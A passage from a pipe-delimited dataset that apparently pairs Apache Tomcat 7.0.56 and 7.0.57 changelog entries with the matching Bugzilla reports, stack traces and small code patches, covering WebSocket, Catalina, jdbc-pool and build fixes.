at org.apache.tomcat.websocket.AsyncChannelWrapperSecure$WrapperFuture.get(AsyncChannelWrapperSecure.java:508)
at org.apache.tomcat.websocket.WsWebSocketContainer.processResponse(WsWebSocketContainer.java:542)
at org.apache.tomcat.websocket.WsWebSocketContainer.connectToServer(WsWebSocketContainer.java:296)
... 29 more
Caused by: org.apache.tomcat.websocket.ReadBufferOverflowException
at org.apache.tomcat.websocket.AsyncChannelWrapperSecure$ReadTask.run(AsyncChannelWrapperSecure.java:305)
at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1121)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:614)
at java.lang.Thread.run(Thread.java:777)
!SUBENTRY 1 org.cloudfoundry.ide.eclipse.server.core 4 0 2014-06-12 11:52:13.254
!MESSAGE Error performing Cloud Foundry operation: javax.websocket.DeploymentException: The HTTP request to initiate the WebSocket connection failed
!STACK 0
org.cloudfoundry.client.lib.CloudOperationException: javax.websocket.DeploymentException: The HTTP request to initiate the WebSocket connection failed
at org.cloudfoundry.client.lib.rest.LoggregatorClient.connectToLoggregator(LoggregatorClient.java:45)
at org.cloudfoundry.client.lib.rest.CloudControllerClientImpl.streamLoggregatorLogs(CloudControllerClientImpl.java:1634)
at org.cloudfoundry.client.lib.rest.CloudControllerClientImpl.streamLogs(CloudControllerClientImpl.java:233)
at org.cloudfoundry.client.lib.CloudFoundryClient.streamLogs(CloudFoundryClient.java:336)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.CloudFoundryServerBehaviour$19.doRun(CloudFoundryServerBehaviour.java:778)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.CloudFoundryServerBehaviour$19.doRun(CloudFoundryServerBehaviour.java:1)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.BaseClientRequest.runAndWait(BaseClientRequest.java:127)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.ClientRequest.runAndWait(ClientRequest.java:66)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.LocalServerRequest.runAndWait(LocalServerRequest.java:64)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.BaseClientRequest.run(BaseClientRequest.java:70)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.CloudFoundryServerBehaviour.addApplicationLogListener(CloudFoundryServerBehaviour.java:782)
at org.cloudfoundry.ide.eclipse.server.ui.internal.console.ApplicationLogConsoleStream.initialiseStream(ApplicationLogConsoleStream.java:82)
at org.cloudfoundry.ide.eclipse.server.ui.internal.console.CloudFoundryConsole.getStream(CloudFoundryConsole.java:84)
at org.cloudfoundry.ide.eclipse.server.ui.internal.console.CloudFoundryConsole.startTailing(CloudFoundryConsole.java:64)
at org.cloudfoundry.ide.eclipse.server.ui.internal.console.ConsoleManager.startConsole(ConsoleManager.java:112)
at org.cloudfoundry.ide.eclipse.server.ui.internal.CloudFoundryUiCallback.startApplicationConsole(CloudFoundryUiCallback.java:79)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.CloudFoundryServerBehaviour$RestartOperation.performDeployment(CloudFoundryServerBehaviour.java:2643)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.CloudFoundryServerBehaviour$StartOperation.performDeployment(CloudFoundryServerBehaviour.java:2232)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.CloudFoundryServerBehaviour$PushApplicationOperation.performDeployment(CloudFoundryServerBehaviour.java:2460)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.CloudFoundryServerBehaviour$ApplicationOperation.performOperation(CloudFoundryServerBehaviour.java:1994)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.AbstractDeploymentOperation.run(AbstractDeploymentOperation.java:42)
at org.cloudfoundry.ide.eclipse.server.core.internal.client.CloudFoundryServerBehaviour.publishModule(CloudFoundryServerBehaviour.java:1367)
at org.eclipse.wst.server.core.model.ServerBehaviourDelegate.publishModule(ServerBehaviourDelegate.java:1091)
at org.eclipse.wst.server.core.model.ServerBehaviourDelegate.publishModules(ServerBehaviourDelegate.java:1183)
at org.eclipse.wst.server.core.model.ServerBehaviourDelegate.publish(ServerBehaviourDelegate.java:987)
at org.eclipse.wst.server.core.model.ServerBehaviourDelegate.publish(ServerBehaviourDelegate.java:774)
at org.eclipse.wst.server.core.internal.Server.publishImpl(Server.java:3154)
at org.eclipse.wst.server.core.internal.Server$PublishJob.run(Server.java:345)
at org.eclipse.core.internal.jobs.Worker.run(Worker.java:53)
Caused by: javax.websocket.DeploymentException: The HTTP request to initiate the WebSocket connection failed
at org.apache.tomcat.websocket.WsWebSocketContainer.connectToServer(WsWebSocketContainer.java:315)
at org.cloudfoundry.client.lib.rest.LoggregatorClient.connectToLoggregator(LoggregatorClient.java:42)
... 28 more
Caused by: java.util.concurrent.ExecutionException: org.apache.tomcat.websocket.ReadBufferOverflowException
    at org.apache.tomcat.websocket.AsyncChannelWrapperSecure$WrapperFuture.get(AsyncChannelWrapperSecure.java:508)
    at org.apache.tomcat.websocket.WsWebSocketContainer.processResponse(WsWebSocketContainer.java:544)
    at org.apache.tomcat.websocket.WsWebSocketContainer.connectToServer(WsWebSocketContainer.java:297)
    ... 6 more
Caused by: org.apache.tomcat.websocket.ReadBufferOverflowException
    at org.apache.tomcat.websocket.AsyncChannelWrapperSecure$ReadTask.run(AsyncChannelWrapperSecure.java:305)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:744)

And the fix is rather straightforward--

On lines 565-567 of http://svn.apache.org/repos/asf/tomcat/tc7.0.x/trunk/java/org/apache/tomcat/websocket/WsWebSocketContainer.java

Just add:

if (!readHeaders) {
  response.compact();
}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57054
WebSocket|Tomcat 7.0.57 (violetagg)|fix||Fix client subprotocol handling. (remm)|||
WebSocket|Tomcat 7.0.57 (violetagg)|fix||Add null checks for arguments in remote endpoint. (remm/kkolinko)|||
WebSocket|Tomcat 7.0.57 (violetagg)|fix|57091|Work around the behaviour of the Oracle JRE when creating new threads in an applet environment that breaks the WebSocket client implementation. Patch provided by Niklas Hallqvist. (markt)|Websockets cannot be used in Windows applet plugin environments based on Oracle Java7|"When using the Tomcat8 Websockets implementation in a Windows JRE 1.7.0_67 applet environment an AccessControlException occurs even though a policy allowing everything is in charge.

Exception in thread ""anInnocuousThread"" java.security.AccessControlException: access denied (""java.lang.RuntimePermission"" ""setContextClassLoader"")
	at java.security.AccessControlContext.checkPermission(Unknown Source)
	at java.security.AccessController.checkPermission(Unknown Source)
	at java.lang.SecurityManager.checkPermission(Unknown Source)
	at sun.plugin2.applet.AWTAppletSecurityManager.checkPermission(Unknown Source)
	at java.lang.Thread.setContextClassLoader(Unknown Source)
	at org.apache.tomcat.websocket.AsyncChannelGroupUtil$AsyncIOThreadFactory.newThread(AsyncChannelGroupUtil.java:112)
	at java.util.concurrent.ThreadPoolExecutor$Worker.<init>(Unknown Source)
	at java.util.concurrent.ThreadPoolExecutor.addWorker(Unknown Source)
	at java.util.concurrent.ThreadPoolExecutor.execute(Unknown Source)
	at org.apache.tomcat.util.threads.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:161)
	at org.apache.tomcat.util.threads.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:141)
	at sun.nio.ch.AsynchronousChannelGroupImpl.executeOnPooledThread(Unknown Source)
	at sun.nio.ch.Invoker.invokeIndirectly(Unknown Source)
	at sun.nio.ch.Invoker.invoke(Unknown Source)
	at sun.nio.ch.Invoker.invoke(Unknown Source)
	at sun.nio.ch.WindowsAsynchronousSocketChannelImpl$ReadTask.completed(Unknown Source)
	at sun.nio.ch.Iocp$EventHandlerTask.run(Unknown Source)
	at java.lang.Thread.run(Unknown Source)
	at sun.misc.InnocuousThread.run(Unknown Source)

The problem is actually in the JVM which installs a null protection domain which fails every access checked operation.  Apparantly Oracle won't fix this, according to https://issues.apache.org/jira/browse/SSHD-332, but there is a workaround which is fairly easy.  It is modelled after the fix to the SSHD one found in the link above.

Index: /d/sd0h/h/niklas/java/workspace-1/Tomcat8/java/org/apache/tomcat/websocket/AsyncChannelGroupUtil.java
===================================================================
--- /d/sd0h/h/niklas/java/workspace-1/Tomcat8/java/org/apache/tomcat/websocket/AsyncChannelGroupUtil.java	(revision 1630809)
+++ /d/sd0h/h/niklas/java/workspace-1/Tomcat8/java/org/apache/tomcat/websocket/AsyncChannelGroupUtil.java	(working copy)
@@ -18,6 +18,8 @@
 
 import java.io.IOException;
 import java.nio.channels.AsynchronousChannelGroup;
+import java.security.AccessController;
+import java.security.PrivilegedAction;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.SynchronousQueue;
 import java.util.concurrent.ThreadFactory;
@@ -106,12 +108,16 @@
         private AtomicInteger count = new AtomicInteger(0);
 
         @Override
-        public Thread newThread(Runnable r) {
-            Thread t = new Thread(r);
-            t.setName(""WebSocketClient-AsyncIO-"" + count.incrementAndGet());
-            t.setContextClassLoader(this.getClass().getClassLoader());
-            t.setDaemon(true);
-            return t;
+        public Thread newThread(final Runnable r) {
+            return (Thread)AccessController.doPrivileged(new PrivilegedAction<Object>() {
+        	public Object run() {
+        	    Thread t = new Thread(r);
+        	    t.setName(""WebSocketClient-AsyncIO-"" + count.incrementAndGet());
+        	    t.setContextClassLoader(this.getClass().getClassLoader());
+        	    t.setDaemon(true);
+        	    return t;
+        	}
+            });
         }
     }
 }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57091
WebSocket|Tomcat 7.0.57 (violetagg)|fix|57118|Ensure that that an EncodeException is thrown by RemoteEndpoint.Basic.sendObject(Object) rather than an IOException when no suitable Encoder is configured for the given Object. (markt)|Throw EncodeException from RemoteEndpoint.Basic.sendObject()|"(Noted when updating documentation in r1632965)

The method javax.websocket.RemoteEndpoint.Basic.sendObject(Object) is expected to throw EncodeException if there is no suitable encoder configured for the object type.

The actual implementation in org.apache.tomcat.websocket.WsRemoteEndpointBasic.sendObject(Object) does not throw that exception, because the method that is called there does not throw it. It is not even declares a ""throws"" for it, and it is a checked exception.

My understanding is that the exception is passed to a competition handler, but it is not properly unwrapped. An IOException is thrown instead."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57118
Web applications|Tomcat 7.0.57 (violetagg)|fix||Correct documentation for ServerCookie.ALLOW_NAME_ONLY system property. (kkolinko)|||
Web applications|Tomcat 7.0.57 (violetagg)|fix|57049|Clarified that jvmRoute can be set in <Engine>'s jvmRoute or in a system property. (schultz)|Engine jvmRoute documentation should mention the system property that can affect its value|To facilitate dynamic deployments where a jvmRoute is set e.g. using a system property, an empty jvmRoute attribute should behave the same as having no jvmRoute attribute set.|https://bz.apache.org/bugzilla/show_bug.cgi?id=57049
Web applications|Tomcat 7.0.57 (violetagg)|fix||Correct version of Java WebSocket mentioned in documentation (s/1.0/1.1/). (markt/kkolinko)|||
Web applications|Tomcat 7.0.57 (violetagg)|update||In examples web application move Async and Comet examples from JSP to Servlet examples page. (kkolinko)|||
Web applications|Tomcat 7.0.57 (violetagg)|update||Suppress timestamp comments and enable charset header in Javadoc. (kkolinko)|||
jdbc-pool|Tomcat 7.0.57 (violetagg)|fix|57079|Use Tomcat version number for jdbc-pool module when building and shipping the module as part of Tomcat. (markt/kkolinko)|Use Tomcat version number in jdbc-pool manifest when building it as part of Tomcat|"Looking into tomcat-jdbc.jar/META-INF/MANIFEST.MF file,

Actual behaviour:
currently (e.g. for 8.0.14) it contains:
[[[
Manifest-Version: 1.0
Ant-Version: Apache Ant 1.7.0
Created-By: 11.0-b16 (Sun Microsystems Inc.)
Export-Package: org.apache.tomcat.jdbc.naming;uses:=""javax.naming,org.
 apache.juli.logging,javax.naming.spi"";version=""1.1.0.1"",org.apache.to
 mcat.jdbc.pool;uses:=""org.apache.juli.logging,javax.sql,org.apache.to
 mcat.jdbc.pool.jmx,javax.management,javax.naming,javax.naming.spi,org
 .apache.tomcat.jdbc.pool.interceptor"";version=""1.1.0.1"",org.apache.to
 mcat.jdbc.pool.interceptor;uses:=""org.apache.tomcat.jdbc.pool,org.apa
 che.juli.logging,javax.management.openmbean,javax.management"";version
 =""1.1.0.1"",org.apache.tomcat.jdbc.pool.jmx;uses:=""org.apache.tomcat.j
 dbc.pool,org.apache.juli.logging,javax.management"";version=""1.1.0.1""
Bundle-Vendor: Apache Software Foundation
Bundle-Version: 1.1.0.1
Bundle-Name: Apache Tomcat JDBC Connection Pool
Bundle-ManifestVersion: 2
Bundle-SymbolicName: org.apache.tomcat.jdbc
Import-Package:  javax.management;version=""0"", javax.management.openmb
 ean;version=""0"", javax.naming;version=""0"", javax.naming.spi;version=""
 0"", javax.sql;version=""0"", org.apache.juli.logging;version=""0""
]]]

It is generated from template in modules/jdbc-pool/resources/MANIFEST.MF 

Expected behaviour:
1) I expected ""Ant-Version: Apache Ant 1.8.4"", because that was the version of Ant used to build Tomcat 8.0.14.
""Ant-Version: Apache Ant 1.7.0"" is hard-coded in template file.

2) ""Bundle-Version: 1.1.0.1"" and versions in ""Export-Package"" to be 8.0.14.
The goal is to discern different builds of JDBC Pool.
I guess it boils down to passing relevant ${version} property when invoking its build file from Tomcat one.

Can we change that ""1.1.0.1"" to be ""8.0.14"", or there will be any problems?

As this issue involves OSGi, a better reference would be bug 52381."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57079
jdbc-pool|Tomcat 7.0.57 (violetagg)|fix||"Fix broken overview page in javadoc generated via ""javadoc"" task in jdbc-pool build.xml file. (kkolinko)"|||
Other|Tomcat 7.0.57 (violetagg)|update|56079|The Apache Tomcat Windows service and the Apache Tomcat Windows service monitor application are now digitally signed. (markt)|Digitally sign the Windows binaries|"I am currently evaluating a code-signing service for the ASF using Tomcat as a test case. It would help if folks who use Tomcat on Windows could provide use cases where they currently receive a warning so I can figure out what needs to be signed and test those use cases with signed versions.

So far the only test case I have is:
- Windows 7 Pro. Install Tomcat 8.0.0-RC10 form the installer.
  Attempting to use tomcat8w.exe triggers a warning if it is not
  signed. When it is signed there is still a warning but one that
  is less severe and includes the information that it has been signed
  by the ASF.

More test cases welcome. Please provide OS version details and steps to re-create from a clean Tomcat install.

Please add your test cases here."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56079
Other|Tomcat 7.0.57 (violetagg)|fix||Fix timestamps in Tomcat build and jdbc-pool to use 24-hour format instead of 12-hour one and use UTC timezone. (markt/kkolinko)|||
Other|Tomcat 7.0.57 (violetagg)|update||Improve Tomcat build script to ensure that only one ecj-nn.jar file is present in Tomcat lib directory when Eclipse JDT Compiler is updated to a new version. (kkolinko)|||
Other|Tomcat 7.0.57 (violetagg)|update|56596|Update to Tomcat Native Library version 1.1.32 to pick up the Windows binaries that are based on OpenSSL 1.0.1j and APR 1.5.1. (markt)|OpenSSL 1.0.1g is vulnerable to a man-in-the-middle attack|"Open SSL has issued a security advisory against a man-in -the-middle attack vulnerability and recommends to upgrade to open ssl version 1.0.1h
The latest Tomcat native library was build using openssl 1.0.1g.

Please create a new build with the latest open SSL version 1.0.1h to mitigate this vulnerability in tomcat native library. 

The following links describe the vulnerability - 
https://www.us-cert.gov/ncas/current-activity/2014/06/05/OpenSSL-Releases-Security-Advisory
http://www.openssl.org/news/secadv_20140605.txt
http://www.kb.cert.org/vuls/id/978508"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56596
Other|Tomcat 7.0.57 (violetagg)|code||In Tomcat tests: log name of the current test method at start time. (kkolinko)|||
Catalina|Tomcat 7.0.56 (violetagg)|fix||When scanning class files (e.g. for annotations) and reading the number of parameters in a MethodParameters structure only read a single byte (rather than two bytes) as per the JVM specification. Patch provided by Francesco Komauli. (markt)|||
Catalina|Tomcat 7.0.56 (violetagg)|fix||Allow the JNDI Realm to start even if the directory is not available. The directory not being available is not fatal once the Realm is started and it need not be fatal when the Realm starts. Based on a patch by C√©dric Couralet. (markt)|||
Catalina|Tomcat 7.0.56 (violetagg)|fix|56736|Avoid an incorrect IllegalStateException if the async timeout fires after a non-container thread has called AsyncContext.dispatch() but before a container thread starts processing the dispatch. (markt)|IllegalStateException after calling AsyncContext.dispatch|"Requests timeout occasionally with the following error after calling AsyncContext.dispatch:

10-Jul-2014 01:40:33.145 SEVERE [http-nio-8080-exec-2] org.apache.catalina.connector.CoyoteAdapter.asyncDispatch Exception while processing an asynchronous request
 java.lang.IllegalStateException: Calling [asyncTimeout()] is not valid for a request with Async state [DISPATCHING]
    at org.apache.coyote.AsyncStateMachine.asyncTimeout(AsyncStateMachine.java:267)
    ...

Happens also with the Java Blocking Connector (Http11Protocol).

Could not reproduce on Tomcat 7.0.54.

Can be reproduced with the sample project with the following request:
http://localhost:8080/servlet3-async/error2?fail=true

Sample code and more information about the test can be found here:
https://github.com/marko-asplund/servlet3-async

Verified on:
Ubuntu 14.04 / OpenJDK 1.7.0_55
Mac OS X 10.8.5 / Oracle Java 1.7.0_55"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56736
Catalina|Tomcat 7.0.56 (violetagg)|fix|56739|If an application handles an error on an application thread during asynchronous processing by calling HttpServletResponse.sendError(), then ensure that the application is given an opportunity to report that error via an appropriate application defined error page if one is configured. (markt)|Error response body generated only occasionally|"When using the following approach in an asynchronous servlet for reporting an error condition, an error response body is generated only occasionally:

((HttpServletResponse) asyncContext.getResponse()).sendError(statusCode, message);
asyncContext.complete()

Based on a discussion on tomcat-users this should be a valid approach:

http://mail-archives.apache.org/mod_mbox/tomcat-users/201407.mbox/%3c53BD085C.7010205@apache.org%3e
(subject: ""Servlet 3.1 asynchronous processing API"")

Here's how to reproduce the issue:

marko@ubuntu:~$ ab -v 2 -l -n 100 'http://localhost:8080/servlet3-async/error1?fail=true' |grep ^Content-Length| sort | uniq -c
     95 Content-Length: 0
      5 Content-Length: 1082

The code and more information about the test can be found here:
https://github.com/marko-asplund/servlet3-async

Verified on:
Ubuntu 14.04 / OpenJDK 1.7.0_55
Mac OS X 10.8.5 / Oracle Java 1.7.0_55

The same thing occurs with Tomcat 7.0.54."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56739
Catalina|Tomcat 7.0.56 (violetagg)|fix|56771|When lookup for a resource in all the alternate or backup javax.naming.directory.DirContext, javax.naming.NameNotFoundException will be thrown at the end of the search if the resource is not available in these alternate or backup javax.naming.directory.DirContext. Based on a patch by Sheldon Shao. (violetagg)|Avoid throwing NameNotFoundException in BaseDirContext#lookup()|"Created attachment 31848 [details]
The issue

NameNotFoundException is thrown when the resource can't be found in this DirContext.

In the method BaseDirContext, it also goes through all the alternate or backup DirContexts to lookup the resource one by one until the resource is found.
A NameNotFoundException is thrown in the alternate DirContext when the given resource name isn't in this DirContext.

Ôªø  public final Object lookup(String name) throws NamingException {
        // First check for aliases
        if (!aliases.isEmpty()) {
            AliasResult result = findAlias(name);
            if (result.dirContext != null) {
                return result.dirContext.lookup(result.aliasName);
            }
        }
        
        // Next do a standard lookup
        Object obj = doLookup(name);

        if (obj != null)
            return obj;
        
        // Check the alternate locations
        for (DirContext altDirContext : altDirContexts) {
            try {
                obj = altDirContext.lookup(""/META-INF/resources"" + name);
                if (obj != null)
                    return obj;
            } catch ( NamingException ex) {
                // ignore
            }
        }
        
        // Really not found
        throw new NameNotFoundException(
                sm.getString(""resources.notFound"", name));
    }


It takes much CPU time.   It could be optimized by checking result is null or not.

Here is the optimized code,
    public final Object lookup(String name) throws NamingException {
        // First check for aliases
        Object obj = doLookupWithoutNFE(name);
        if (obj != null) {
            return obj;
        }

        // Really not found
        throw new NameNotFoundException(
                sm.getString(""resources.notFound"", name));
    }

    protected Object doLookupWithoutNFE(String name) throws NamingException {
        if (!aliases.isEmpty()) {
            AliasResult result = findAlias(name);
            if (result.dirContext != null) {
                return result.dirContext.lookup(result.aliasName);
            }
        }
        
        // Next do a standard lookup
        Object obj = doLookup(name);

        if (obj != null)
            return obj;
        
        // Check the alternate locations
        String resourceName = ""/META-INF/resources"" + name;
        for (DirContext altDirContext : altDirContexts) {
            if (altDirContext instanceof BaseDirContext) {
                obj = ((BaseDirContext)altDirContext).doLookupWithoutNFE(resourceName);
            }
            else {
                try {
                    obj = altDirContext.lookup(resourceName);
                } catch ( NamingException ex) {
                    // ignore
                }
            }
            if (obj != null) {
                return obj;
            }
        }
        
        //Return null instead
        return null;
    }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56771
Catalina|Tomcat 7.0.56 (violetagg)|fix|56796|Remove unnecessary sleep when stopping a web application. (markt)|Avoid sleep usage in  org.apache.tomcat.util.threads.ThreadPoolExecutor#contextStopping|"At the moment on trunk  org.apache.tomcat.util.threads.ThreadPoolExecutor#contextStopping does a sleep(200). Would be great to be able to remove it.

This is an issue in particular when using arquillian and if you deploy several small wars - one by test.

On BVal TCKs in TomEE it makes tests during ~6mn on my machines so removing it I can gain (758 test * 200 ms) = 151s (looks like a big part ;))"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56796
Catalina|Tomcat 7.0.56 (violetagg)|fix|56801|Improve performance of org.apache.tomcat.util.file.Matcher which is to filter JARs for scanning during web application start. Based on a patch by Sheldon Shao. (kkolinko)|Avoid duplicated String to CharArray conversion in the loop of Matcher#matchName|"Created attachment 31865 [details]
Patch for Matcher

The loop in matchName,

    public static boolean matchName(Set<String> patternSet, String fileName) {
        for (String pattern: patternSet) {
            if (match(pattern, fileName, true)) {
                return true;
            }
        }
        return false;
    }


Optimized,

    public static boolean matchName(Set<String> patternSet, String fileName) {
        char[] charArray = fileName.toCharArray();
        for (String pattern: patternSet) {
            if (match(pattern, charArray, true)) {
                return true;
            }
        }
        return false;
    }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56801
Catalina|Tomcat 7.0.56 (violetagg)|fix|56825|Enable pre-emptive authentication to work with the SSL authenticator. Based on a patch by jlmonteiro. (markt)|AuthenticatorBase not looking for Coyote Request certificate|"When using Tomcat SSL coyote connector, the request does not by default contain the certificate chain under the key javax.servlet.request.X509Certificate

The following coyote action must be invoked in order to extract the certificate chain and enrich the request under the right key.

This makes it impossible to use the SSLAuthenticator with preemptive mode for example.

Provided a test to reproduce and the fix within the patch file.
I tried to follow Tomcat guidelines and coding rules. If not lemme know so that I can resubmit a new patch.

Not tested under Tomcat 6 and 8 but, the AuthenticatorBase does not change a lot over versions so I guess the bug existed before Tomcat 7 and still exists in Tomcat 8."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56825
Catalina|Tomcat 7.0.56 (violetagg)|fix|56857|Fix thread safety issue when calling ServletContext methods while running under a security manager. (markt)|Thread safety issue in ApplicationContextFacade.invokeMethod|"Multiple subsequent Thread dumps were exhibiting lots of threads hanging in HashMap.get() while in RUNNABLE status, and consuming high CPU - a typical indicator of a thread safety issue with these non-threadsafe Maps.
Thread stacks all as below.

ApplicationContextFacade implements ServletContext, these objects are singletons per webapp, and get passed around among multiple threads. Their private member ""objectCache"" is a HashMap, i.e. not thread safe, but gets accessed AND modified without any synchronization in invokeMethod().

Suggested remedy: change to a ConcurrentHashMap, which is thread-safe, and performs much better than synchronizing on every access.

""connector-93: userId=_101_1, sessionId=C9EC1C59DD2244557BC6231A5476000E"" daemon prio=10 tid=0x00007fb1e40cf800 nid=0x7b90 runnable [0x00007fb1e82c3000]
   java.lang.Thread.State: RUNNABLE
	at java.util.HashMap.get(HashMap.java:326)
	at org.apache.catalina.core.ApplicationContextFacade.invokeMethod(ApplicationContextFacade.java:789)
	at org.apache.catalina.core.ApplicationContextFacade.doPrivileged(ApplicationContextFacade.java:767)
	at org.apache.catalina.core.ApplicationContextFacade.getContextPath(ApplicationContextFacade.java:428)
	at blackboard.portal.servlet.ModuleCustomizationServlet.service(ModuleCustomizationServlet.java:88)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
..."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56857
Catalina|Tomcat 7.0.56 (violetagg)|code|56882|Add testcase for processing of forwards and includes when Context have been reloaded. (kkolinko)|"""HTTP Status 503 - Servlet jsp is currently unavailable"" after Context reload"|"After a Context reload with Tomcat Manager all JSP calls with this.getServletContext().getRequestDispatcher(""/jspname.jsp"").forward(request, response); create a ""HTTP Status 503 - Servlet jsp is currently unavailable"" response. With Tomcat 8.0.9 and Tomcat 7.0.55 it works."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56882
Catalina|Tomcat 7.0.56 (violetagg)|fix|56900|Fix some potential resource leaks when reading property files reported by Coverity Scan. Based on patches provided by Felix Schumacher. (markt)|Resource Leaks found by CID 45266 and 45249|"Created attachment 31953 [details]
Close InputStream after use. Factor out common code into a private method.

InputStreams are not closed after using them for loading the content into properties.

This happens a few times in the code base and seems to be a common task. Maybe we should create a utility-method to capsulate that funtion.

For DefaultInstanceManager I have created a private method. For ContextConfig I adapted to local logic only."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56900
Catalina|Tomcat 7.0.56 (violetagg)|fix|56902|Fix a potential resource leak in the Default Servlet reported by Coverity Scan. Based on a patch provided by Felix Schumacher. (markt)|DefaultServlet could leak resource in method copy - CID-45243|"Created attachment 31955 [details]
always close istream in DefaultServlet#copy

In method copy istream could be left unclosed, if write operations on ostream would throw an exception before copyRange is called.

A simple fix is to wrap the ostream-operations together with copyRange in a try-finally block.

If the exceptions should be catched into the variable exception like copyRange does, it could be done so in an additionally catch block (which is missing from the attached patch)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56902
Catalina|Tomcat 7.0.56 (violetagg)|fix|56903|Correct the return value for StandardContext.getResourceOnlyServlets() so that multiple names are separated by commas. Identified by Coverity Scan and fixed based on a patch by Felix Schumacher. (markt)|Missing comma-Separator in StandardContexts getRessourceOnlyServlets - CID-45051|"Created attachment 31956 [details]
Set flag in loop, so that commata are generated in between servlet names

A missing setting of a flag in a loop prevented the generation of commata in between serlvet names in StandardContext#getRessourceOnlyServlets."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56903
Catalina|Tomcat 7.0.56 (violetagg)|fix||Fixed the multipart elements merge operation performed during web application deployment. Identified by Coverity Scan. (violetagg)|||
Catalina|Tomcat 7.0.56 (violetagg)|fix||Correct the information written by ExtendedAccessLogValve when a format token x-O(XXX) is used so that multiple values for a header XXX are separated by commas. Identified by Coverity Scan. (violetagg)|||
Catalina|Tomcat 7.0.56 (violetagg)|fix||Fix a potential resource leak when reading MANIFEST.MF file for extension dependencies reported by Coverity Scan. (violetagg)|||
Catalina|Tomcat 7.0.56 (violetagg)|fix||Correctly handle multiple accept-language headers rather than just using the first header to determine the user's preferred Locale. (markt)|||
Catalina|Tomcat 7.0.56 (violetagg)|fix||Fix some potential resource leaks when reading properties, files and other resources. Reported by Coverity Scan. (violetagg)|||
Catalina|Tomcat 7.0.56 (violetagg)|fix||When using parallel deployment and undeployOldVersions feature is enabled on a Host, correctly undeploy context of old version. Make sure that Tomcat does not undeploy older Context if current context is not running. (kfujino)|||
Catalina|Tomcat 7.0.56 (violetagg)|fix||When deploying war, add XML file in the config base to the redeploy resources if war does not have META-INF/context.xml or deployXML is false. If XML file is created in the config base, redeploy will occur. (kfujino)|||
Catalina|Tomcat 7.0.56 (violetagg)|code||Various changes to reduce unnecessary code in Tomcat's copy of Apache Commons BCEL to reduce the time taken for annotation scanning when web applications start. Includes contributions from kkolinko and hzhang9. (markt)|||
Catalina|Tomcat 7.0.56 (violetagg)|fix|56938|Ensure web applications that have mixed case context paths and are deployed as directories are correctly removed on undeploy when running on a case sensitive file system. (markt)|Applications with uppercase context paths cannot be updated|"Tomcat 8.0.12 cannot update applications with uppercase context paths if the application is deployed as a compressed WAR file.

For the bug to occur, two deployments are required (let's call them v1 and v2).

Deployment v1 goes through fine.  Both the WAR and unpacked directory are updated.

Deployment v2 succeeds, but the application continues to serve v1.  The webapps WAR file is updated, but the unpacked app directory is not.

I traced the issue to HostConfig.java line 1226:

1225: String docBase = context.getDocBase();
1226:   docBase = docBase.toLowerCase(Locale.ENGLISH);
1227:   if (!docBase.endsWith("".war"")) {
...
1234:     ExpandWar.delete(docBaseFile);
...
1237:   }
1238:   reload(app)

The lowercase context path is passed to ExpandWar.delete, so the unpacked dir is not deleted on case-sensitive filesystems.  Tomcat reports a successful deployment of v2 in the Manager interface.

The toLowerCase call should be moved into the if statement, or bound to a separate variable.  The original case-sensitive docBase path must be passed to ExpandWar.delete."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56938
Catalina|Tomcat 7.0.56 (violetagg)|add|57004|Add stuckThreadCount property to StuckThreadDetectionValve's JMX bean. Patch provided by Ji≈ô√≠ Pejchal. (schultz)|Get number of stuck threads from StuckThreadDetectionValve through jmx|"It would be nice if the number of stuck threads reported by StuckThreadDetectionValve was available through jmx (e.g. stuckThreadCount).

The number of stuck threads is stored in the stuckCount variable. However there is no jmx attribute for it, there is only getter for stuckThreadIds which is long[].


I usually use tool like jmxtrans to get the value and plot a graph with graphite."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57004
Catalina|Tomcat 7.0.56 (violetagg)|fix|57011|Ensure that the request and response are correctly recycled when processing errors during async processing. (markt)|Exception when writing HTTP response in the AsyncListener onTimeout method (servlet 3 HTTP-NIO)|"Created attachment 32050 [details]
Servlet

Get the following exception every time the onTimeout method has been called

INFO: Encountered a non-recycled request and recycled it forcedly.
org.apache.catalina.connector.CoyoteAdapter$RecycleRequiredException
	at org.apache.catalina.connector.CoyoteAdapter.checkRecycled(CoyoteAdapter.java:717)
	at org.apache.coyote.http11.AbstractHttp11Processor.recycle(AbstractHttp11Processor.java:1791)
	at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.release(Http11NioProtocol.java:239)
